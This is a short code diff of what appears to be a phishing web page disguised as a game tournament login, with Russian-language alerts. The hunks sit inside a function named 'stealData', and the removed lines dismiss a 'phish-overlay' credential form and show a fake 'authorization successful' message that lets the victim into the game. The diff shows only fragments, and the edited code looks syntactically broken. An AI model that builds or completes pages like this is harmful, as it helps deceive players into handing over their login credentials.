@@ -88,12 +88,6 @@ function stealData() {
             alert("Ошибка синхронизации. Попробуйте войти позже.");
         });
         
-        // Скрываем форму и пускаем в игру
-        document.getElementById('phish-overlay').style.display = 'none';
-        alert("Авторизация успешна. Добро пожаловать в турнир!");
-    } else {
-        alert("Введите данные для входа");
-    }
 }
     function render() {
         boardEl.innerHTML = '';
@@ -218,5 +212,6 @@ function stealData() {
 </script>
 </body>
 </html>
+
 
 
